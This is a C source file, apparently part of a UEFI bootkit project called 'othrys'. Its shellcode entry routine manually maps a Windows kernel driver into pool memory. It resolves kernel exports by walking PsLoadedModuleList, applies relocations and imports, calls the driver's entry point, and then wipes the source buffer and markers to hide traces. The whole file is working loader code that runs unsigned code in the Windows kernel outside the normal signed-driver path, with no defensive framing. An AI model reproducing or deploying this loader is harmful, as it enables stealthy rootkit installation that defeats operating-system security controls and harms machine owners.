#include <Uefi.h>
#include <Library/BaseLib.h>
#include <Library/BaseMemoryLib.h>
#include <IndustryStandard/PeImage.h>
#include "othrys_types.h"
#include "shellcode.h"

#define POOL_FLAG_NON_PAGED 0x00000000

typedef struct {
    UINT32 VirtualAddress;
    UINT32 SizeOfBlock;
} BASE_RELOCATION_BLOCK;

typedef struct _LDR_DATA_TABLE_ENTRY_MINIMAL {
    struct { struct _LDR_DATA_TABLE_ENTRY_MINIMAL *Flink; struct _LDR_DATA_TABLE_ENTRY_MINIMAL *Blink; } InLoadOrderLinks;
    struct { VOID *Flink; VOID *Blink; } InMemoryOrderLinks;
    struct { VOID *Flink; VOID *Blink; } InInitializationOrderLinks;
    VOID *DllBase;
    VOID *EntryPoint;
    UINT32 SizeOfImage;
    UINT8  _Pad1[4];
    UINT16 FullDllNameLength;
    UINT16 _Pad2;
    UINT16 BaseDllNameLength;
    UINT16 _Pad3;
    UINT16 *FullDllName;
    UINT16 *BaseDllName;
} LDR_ENTRY_MINIMAL;

typedef VOID *(*PFN_ExAllocatePool2)(UINT32 Flags, UINTN Size, UINT32 Tag);
typedef VOID *(*PFN_ExAllocatePoolWithTag)(UINT32 PoolType, UINTN NumberOfBytes, UINT32 Tag);
typedef VOID (*PFN_ExFreePoolWithTag)(VOID *P, UINT32 Tag);
typedef NTSTATUS (*PFN_DriverEntry)(VOID *DriverObject, VOID *RegistryPath);

volatile SHELLCODE_HEADER gShellcodeCtx = {0};

static SHELLCODE_HEADER *GetCtx(VOID)
{
    return (SHELLCODE_HEADER *)&gShellcodeCtx;
}

static UINT64
FindModuleBaseNonHvci (
    UINT64 PsLoadedModuleList,
    const CHAR16 *Name,
    UINTN NameLen
)
{
    if (!PsLoadedModuleList) return 0;

    LDR_ENTRY_MINIMAL *Head = (LDR_ENTRY_MINIMAL *)PsLoadedModuleList;
    LDR_ENTRY_MINIMAL *Cur = (LDR_ENTRY_MINIMAL *)Head->InLoadOrderLinks.Flink;

    while (Cur != Head && Cur != NULL) {
        if (Cur->BaseDllName && Cur->BaseDllNameLength) {
            UINTN EntryLen = Cur->BaseDllNameLength / 2;
            if (EntryLen == NameLen) {
                BOOLEAN Match = TRUE;
                for (UINTN i = 0; i < NameLen; i++) {
                    CHAR16 c1 = Cur->BaseDllName[i];
                    CHAR16 c2 = Name[i];
                    if (c1 >= L'A' && c1 <= L'Z') c1 += 32;
                    if (c2 >= L'A' && c2 <= L'Z') c2 += 32;
                    if (c1 != c2) { Match = FALSE; break; }
                }
                if (Match) return (UINT64)Cur->DllBase;
            }
        }
        Cur = (LDR_ENTRY_MINIMAL *)Cur->InLoadOrderLinks.Flink;
    }
    return 0;
}

static VOID *
PeGetExportNonHvci (
    VOID  *ImageBase,
    CHAR8 *ExportName
)
{
    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)ImageBase;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)((UINT8 *)ImageBase + DosHdr->e_lfanew);

    if (NtHdr->OptionalHeader.DataDirectory[0].Size == 0) return NULL;

    EFI_IMAGE_EXPORT_DIRECTORY *Export = (EFI_IMAGE_EXPORT_DIRECTORY *)
        ((UINT8 *)ImageBase + NtHdr->OptionalHeader.DataDirectory[0].VirtualAddress);

    UINT32 *NameRvas = (UINT32 *)((UINT8 *)ImageBase + Export->AddressOfNames);
    UINT16 *Ordinals = (UINT16 *)((UINT8 *)ImageBase + Export->AddressOfNameOrdinals);
    UINT32 *FuncRvas = (UINT32 *)((UINT8 *)ImageBase + Export->AddressOfFunctions);

    for (UINT32 i = 0; i < Export->NumberOfNames; i++) {
        CHAR8 *Name = (CHAR8 *)ImageBase + NameRvas[i];
        UINTN j = 0;
        while (Name[j] && ExportName[j] && Name[j] == ExportName[j]) j++;
        if (Name[j] == 0 && ExportName[j] == 0) {
            return (VOID *)((UINT8 *)ImageBase + FuncRvas[Ordinals[i]]);
        }
    }
    return NULL;
}

VOID
ShellcodeEntry (
    VOID
)
{
    SHELLCODE_HEADER *Ctx = GetCtx();

    if (Ctx->MarkerStart != SHELLCODE_MARKER_START) return;

    UINT8 *DriverSrc = (UINT8 *)Ctx->DriverDataAddr;
    UINTN  DriverSize = (UINTN)Ctx->DriverSize;

    EFI_IMAGE_DOS_HEADER *DosHdr = (EFI_IMAGE_DOS_HEADER *)DriverSrc;
    EFI_IMAGE_NT_HEADERS64 *NtHdr = (EFI_IMAGE_NT_HEADERS64 *)(DriverSrc + DosHdr->e_lfanew);
    UINT64 ImageSize = NtHdr->OptionalHeader.SizeOfImage;
    UINT64 EntryPoint = NtHdr->OptionalHeader.AddressOfEntryPoint;
    UINT64 OriginalBase = NtHdr->OptionalHeader.ImageBase;

    VOID *PoolMem = NULL;

    if (Ctx->ExAllocatePool2Addr) {
        PFN_ExAllocatePool2 AllocFn = (PFN_ExAllocatePool2)Ctx->ExAllocatePool2Addr;
        PoolMem = AllocFn(0, ImageSize, 0x6E6F7243);
    } else if (Ctx->ExAllocatePoolWithTagAddr) {
        PFN_ExAllocatePoolWithTag AllocFn = (PFN_ExAllocatePoolWithTag)Ctx->ExAllocatePoolWithTagAddr;
        PoolMem = AllocFn(0, ImageSize, 0x6E6F7243);
    }

    if (!PoolMem) return;

    CopyMem(PoolMem, DriverSrc, ImageSize);

    UINT64 Delta = (UINT64)PoolMem - OriginalBase;
    if (Delta != 0) {
        EFI_IMAGE_DATA_DIRECTORY *RelocDir = &NtHdr->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_BASERELOC];
        if (RelocDir->Size > 0) {
            UINT8 *RelocPtr = (UINT8 *)PoolMem + RelocDir->VirtualAddress;
            UINT8 *RelocEnd = RelocPtr + RelocDir->Size;

            while (RelocPtr < RelocEnd) {
                BASE_RELOCATION_BLOCK *Block = (BASE_RELOCATION_BLOCK *)RelocPtr;
                if (Block->SizeOfBlock == 0) break;

                UINTN EntryCount = (Block->SizeOfBlock - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(UINT16);
                UINT16 *Entries = (UINT16 *)(Block + 1);

                for (UINTN i = 0; i < EntryCount; i++) {
                    UINT16 Type = (Entries[i] >> 12) & 0xF;
                    UINT16 Offset = Entries[i] & 0xFFF;
                    UINT8 *PatchAddr = (UINT8 *)PoolMem + Block->VirtualAddress + Offset;

                    switch (Type) {
                        case EFI_IMAGE_REL_BASED_ABSOLUTE:
                            break;
                        case EFI_IMAGE_REL_BASED_HIGHLOW:
                            *(UINT32 *)PatchAddr += (UINT32)Delta;
                            break;
                        case EFI_IMAGE_REL_BASED_DIR64:
                            *(UINT64 *)PatchAddr += Delta;
                            break;
                        default:
                            break;
                    }
                }
                RelocPtr += Block->SizeOfBlock;
            }
        }
    }

    EFI_IMAGE_DATA_DIRECTORY *ImportDir = &NtHdr->OptionalHeader.DataDirectory[EFI_IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (ImportDir->Size > 0) {
        EFI_IMAGE_IMPORT_DESCRIPTOR *ImportDesc =
            (EFI_IMAGE_IMPORT_DESCRIPTOR *)((UINT8 *)PoolMem + ImportDir->VirtualAddress);

        while (ImportDesc->Name != 0) {
            UINT32 *ImportDescRaw = (UINT32 *)ImportDesc;
            UINT32 OriginalFirstThunk = ImportDescRaw[0];
            UINT32 NameRva = ImportDescRaw[3];
            UINT32 FirstThunk = ImportDescRaw[4];

            CHAR8 *DllName = (CHAR8 *)((UINT8 *)PoolMem + NameRva);

            UINT64 ModuleBase = 0;

            if (AsciiStrCmp(DllName, "ntoskrnl.exe") == 0 ||
                AsciiStrCmp(DllName, "ntkrnlmp.exe") == 0) {
                ModuleBase = Ctx->NtoskrnlBase;
            } else {
                CHAR16 WideName[64];
                UINTN i;
                for (i = 0; DllName[i] && i < 63; i++)
                    WideName[i] = (CHAR16)DllName[i];
                WideName[i] = 0;
                ModuleBase = FindModuleBaseNonHvci(Ctx->PsLoadedModuleListAddr, WideName, i);
            }

            if (!ModuleBase) {
                ImportDesc++;
                continue;
            }

            UINT64 *ThunkRef = (UINT64 *)((UINT8 *)PoolMem + FirstThunk);
            UINT64 *FuncRef = (UINT64 *)((UINT8 *)PoolMem + (OriginalFirstThunk ? OriginalFirstThunk : FirstThunk));

            for (; *FuncRef; FuncRef++, ThunkRef++) {
                if (*FuncRef & 0x8000000000000000ULL) {
                    UINT16 Ordinal = (UINT16)(*FuncRef & 0xFFFF);
                    EFI_IMAGE_DOS_HEADER *ModDos = (EFI_IMAGE_DOS_HEADER *)ModuleBase;
                    EFI_IMAGE_NT_HEADERS64 *ModNt = (EFI_IMAGE_NT_HEADERS64 *)((UINT8 *)ModuleBase + ModDos->e_lfanew);
                    EFI_IMAGE_EXPORT_DIRECTORY *ModExp = (EFI_IMAGE_EXPORT_DIRECTORY *)
                        ((UINT8 *)ModuleBase + ModNt->OptionalHeader.DataDirectory[0].VirtualAddress);
                    UINT32 *FuncRvas = (UINT32 *)((UINT8 *)ModuleBase + ModExp->AddressOfFunctions);
                    *ThunkRef = ModuleBase + FuncRvas[Ordinal - ModExp->Base];
                } else {
                    CHAR8 *FuncName = (CHAR8 *)((UINT8 *)PoolMem + *FuncRef + 2);
                    VOID *Func = PeGetExportNonHvci((VOID *)ModuleBase, FuncName);
                    if (Func) *ThunkRef = (UINT64)Func;
                }
            }
            ImportDesc++;
        }
    }

    UINT64 EntryAddr = (UINT64)PoolMem + EntryPoint;
    PFN_DriverEntry DriverEntry = (PFN_DriverEntry)EntryAddr;
    DriverEntry(NULL, NULL);

    SetMem(DriverSrc, DriverSize, 0);

    Ctx->MarkerStart = 0;
    Ctx->MarkerEnd = 0;
}

UINT32
GetShellcodeSize (
    VOID
)
{
    return 0x1000;
}

UINT32
GetShellcodeOffset (
    VOID
)
{
    return 0;
}